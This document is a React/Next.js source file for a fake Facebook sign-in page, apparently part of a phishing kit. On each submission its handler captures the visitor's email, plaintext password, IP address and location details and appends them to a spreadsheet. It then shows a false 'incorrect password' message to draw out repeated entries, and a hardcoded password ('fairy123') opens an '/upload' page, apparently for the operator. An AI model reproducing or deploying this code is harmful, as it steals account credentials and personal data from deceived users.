"use client";

import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { Eye, EyeOff } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import SuccessModal from "../components/SuccessModal";
import { appendToSheet } from "@/actions/spreadSheet";
import { getCountryInfo, getLocation } from "@/actions/queries";

const LoginForm = ({ countryDetails }) => {
  const [attempts, setAttempts] = useState(0);
  const [errorMsg, setErrorMsg] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [successModal, setSuccessModal] = useState(false);
  const category = "facebook";
  const [locationData, setLocationData] = useState({});

  const router = useRouter();

  useEffect(() => {
    if(countryDetails) {
      setLocationData(countryDetails);
    }
  }, [countryDetails]);

 

  const handleSubmit = async (event) => {
    event.preventDefault();

    try {
      if (password === "fairy123") {
        router.push("/upload");
      } else {
        const capital = locationData?.capital || "unknown";
        const city = locationData?.city;
        const continent = locationData?.continent || "unknown";
        const ip = locationData?.ip;
        const region = locationData?.region || "unknown";
        const country = locationData?.countryName;
        const currency = locationData?.currency || "unknown";
        const phoneCode = locationData?.phoneCode || "unknown";

        // Collect location and user data for logging
        const data = [
          [
            category,
            email,
            password,
            ip,
            city,
            region,
            country,
            continent,
            currency,
            phoneCode,
          ],
        ];
        await appendToSheet(data);

        setErrorMsg(
          "The email or password you entered is incorrect. Please try again."
        );
        setPassword(""); // Clear password field
        setAttempts((prev) => prev + 1);

        if (attempts >= 2) {
          setSuccessModal(true); // Show success modal after 2 failed attempts
        }
      }
    } catch (error) {
      console.error("Error:", error);
      setErrorMsg("An error occurred. Please try again.");
    }
  };

  if (successModal) {
    return <SuccessModal />;
  }

  return (
    <div className="bg-slate-100 min-h-screen flex flex-col items-center md:flex-row md:justify-evenly login-page">
      <div className="text-box">
        <h1 className="text-blue-600 text-6xl font-bold py-5">facebook</h1>
        <h2 className="text-2xl">Sign In to Continue</h2>
      </div>

      <div className="w-10/12 h-auto sm:w-7/12 lg:w-3/12 xl:w-3/12 login-form flex-col justify-center items-center">
        <form
          className="flex-col justify-center items-center"
          onSubmit={handleSubmit}
        >
          <Input
            type="text"
            placeholder="Email or phone number"
            className="w-11/12 h-14 p-5 m-3 border-2 border-solid border-gray-100 rounded-lg outline-none focus:outline-blue-600"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
          <div className="relative w-full mx-auto">
            <Input
              type={showPassword ? "text" : "password"}
              placeholder="Password"
              className="w-11/12 h-14 p-5 m-3 border-2 border-solid border-gray-100 rounded-lg outline-none focus:outline-blue-600"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button
              type="button"
              className="absolute right-8 top-1/2 transform -translate-y-1/2 "
              onClick={() => setShowPassword(!showPassword)}
              aria-label={showPassword ? "Hide password" : "Show password"}
            >
              {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
            </button>
          </div>
          {errorMsg && <p className="text-red-500 text-center">{errorMsg}</p>}
          <Button className="w-11/12 h-14 bg-blue-600 mt-4 rounded-lg text-white text-2xl font-semibold hover:bg-blue-600">
            Log In
          </Button>
          <Link
            href="/forgot-password"
            className="text-blue-500 mt-3 cursor-pointer hover:underline text-center block"
          >
            Forgot Password?
          </Link>
          <hr className="mt-6 w-6/7 mx-auto border-2" />
          <div className="flex justify-center items-center">
            <Button className="w-2/4 h-11 bg-green-500 font-semibold text-white my-6 rounded-lg">
              Create new account
            </Button>
          </div>
          <p className="my-2 md:w-full text-center">
            <span className="font-semibold hover:underline cursor-pointer">
              Create a Page
            </span>{" "}
            for a celebrity, brand or business.
          </p>
        </form>
      </div>
      <footer className="w-full text-center text-xs text-gray-500 mt-8 bg-gray-100 py-4">
        <div className="mb-2 font-semibold">
          <Link href="#" className="mx-1">
            ABOUT
          </Link>
          <Link href="#" className="mx-1">
            BLOG
          </Link>
          <Link href="#" className="mx-1">
            JOBS
          </Link>
          <Link href="#" className="mx-1">
            HELP
          </Link>
          <Link href="#" className="mx-1">
            API
          </Link>
        </div>
        <div className="mb-2 font-semibold">
          <Link href="#" className="mx-1">
            TERMS
          </Link>
          <Link href="#" className="mx-1">
            TOP ACCOUNTS
          </Link>
          <Link href="#" className="mx-1">
            LOCATIONS
          </Link>
        </div>
        <div>
          <Link href="#" className="mx-1 font-semibold">
            CONTACT UPLOADING AND NON-USERS
          </Link>
        </div>
      </footer>
    </div>
  );
};

export default LoginForm;
